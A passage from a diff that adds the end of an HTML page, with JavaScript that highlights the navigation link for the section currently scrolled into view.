+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
